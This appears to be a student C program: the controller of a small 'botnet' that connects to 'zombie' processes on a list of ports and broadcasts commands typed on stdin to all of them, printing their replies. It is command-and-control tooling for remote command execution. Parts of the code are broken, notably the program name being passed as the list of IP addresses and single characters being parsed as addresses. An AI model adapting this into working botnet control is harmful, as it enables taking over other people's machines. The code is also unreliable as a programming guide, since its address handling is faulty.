#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdarg.h>
#include <time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>

#include "utils_v2.h"
#include "port.h"
#include "botNet.h"

Zombie tabZombie[BACKLOG];
struct pollfd fds[10];
volatile int numberOfZombie = 0;

void done(){
	printf("finito\n");
	exit(0);
}


void discussionProcess (){
	char tabResponse[256];
	int numberSockdead=0;
	while(numberSockdead!=numberOfZombie){
		int ret = poll(fds, numberOfZombie, 1000);
		checkNeg(ret, "server poll error");
		if (ret == 0)
			continue;
		for (int i = 0; i < numberOfZombie; ++i){
			if (fds[i].revents & POLLIN){
			int numberChar2 = sread(fds[i].fd,tabResponse,256);
			if (numberChar2 != 0){
				swrite(1,tabResponse,numberChar2);
			}else{
				numberSockdead++;

			}	
		}

	}
}
}

void getPortIp(char* ip,int numberOfIp){
	int indice=0;
	for (int i = 0; i < numberOfIp; ++i){
		for (int j = 0; j < 10; ++j){
		int sock = ssocket();
		struct sockaddr_in addr;
		memset(&addr,0,sizeof(addr)); 
		addr.sin_family = AF_INET;
		addr.sin_port = htons(tabPorts[j]);
		inet_aton(&ip[i],&addr.sin_addr);
		int ret = connect(sock,
		 (struct sockaddr *) &addr, sizeof(addr));
		if(ret != -1){
			numberOfZombie++;
			fds[indice].fd=sock;
			fds[indice].events = POLLIN;
			indice++;
		}
	}
}
	
	 
}

int main(int argc, char *argv[])
{	
	getPortIp(*argv,argc-1);
	for (int i = 0; i < numberOfZombie ; ++i){
		sread(fds[i].fd,&tabZombie[i],sizeof(Zombie));
		printf("le controlleur ecoute sur le pid %d et le sock %d du zombie %d\n",
		 tabZombie[i].pid,tabZombie[i].sockFd,i+1);	
	}
	char tabCommande [256];

	fork_and_run0(discussionProcess);		
	while(true){
		printf("Veuillez entrez votre commande : \n");
		memset(tabCommande, 0, sizeof(tabCommande));
		int numberChar=read(0,tabCommande,256);
		if(numberChar==0)done();
		for (int i = 0; i < numberOfZombie; ++i){
			printf("le sock %d\n",fds[i].fd);
			int res=write(fds[i].fd,tabCommande,numberChar);
			printf("resuuult %d\n", res);
			

		}
	}

	done();
	return 0;
}

